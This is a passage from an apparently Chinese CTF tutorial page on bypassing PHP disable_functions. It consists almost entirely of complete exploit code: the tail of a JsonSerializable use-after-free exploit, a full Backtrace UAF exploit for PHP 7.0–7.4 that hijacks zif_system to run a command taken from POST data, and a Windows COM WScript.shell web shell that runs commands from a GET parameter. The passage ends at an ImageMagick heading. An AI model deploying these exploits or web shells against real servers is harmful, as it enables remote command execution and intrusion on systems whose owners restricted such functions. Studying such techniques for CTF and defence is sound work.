class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;</span><br><span class="line"></span><br><span class="line">        $contiguous = [];</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $contiguous[] = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line"></span><br><span class="line">        $room = [];</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $room[] = <span class="keyword">new</span> Z();</span><br><span class="line"></span><br><span class="line">        $_protector = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        $p = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>($y[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>($p);</span><br><span class="line"></span><br><span class="line">        $protector = <span class="string">".$_protector"</span>;</span><br><span class="line"></span><br><span class="line">        $x = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line">        $x-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        $x-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'UAF failed.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $spl1 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line">        $spl2 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        $class_entry = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        $handlers = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        $php_heap = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        $abc_addr = $php_heap - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        $fake_obj = $abc_addr;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>, $abc_addr); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x10</span> + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak1($class_entry + <span class="number">0x10</span> + $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        $fake_tbl_off = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x30</span>, $abc_addr + $fake_tbl_off);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x38</span>, $abc_addr + $fake_tbl_off);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        $binary_leak = <span class="keyword">$this</span>-&gt;leak2($handlers + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!($base = <span class="keyword">$this</span>-&gt;get_binary_base($binary_leak))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!($elf = <span class="keyword">$this</span>-&gt;parse_elf($base))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!($basic_funcs = <span class="keyword">$this</span>-&gt;get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!($zif_system = <span class="keyword">$this</span>-&gt;get_system($basic_funcs))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        $fake_bkt_off = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        $function_data = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">4</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2($function_data + <span class="number">0x40</span> * <span class="number">4</span>, $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        $fake_bkt_addr = $abc_addr + $fake_bkt_off;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>, $fake_bkt_addr);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">3</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x58</span> + $i * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        $function_zval = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">12</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc,  $fake_bkt_off + <span class="number">0x70</span> + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2($function_zval, $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off + <span class="number">0x70</span> + <span class="number">0x30</span>, $zif_system);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off, $fake_bkt_addr + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        $spl1-&gt;offsetGet($cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y = [<span class="keyword">new</span> Z()];</span><br><span class="line">json_encode([&amp;$y]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h1><p>影响版本是7.0-7.4  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn($_POST[<span class="string">"pass"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h1><p>window下的组件，开启组件（php5.4以上），开启com.allow_dcom = true，添加extension=php_com_dotnet.dll</p><p><img src="../../images/ctf/ctfhub/3.png" alt=""><br>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/ctfhub/4.png" alt=""></p><h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" 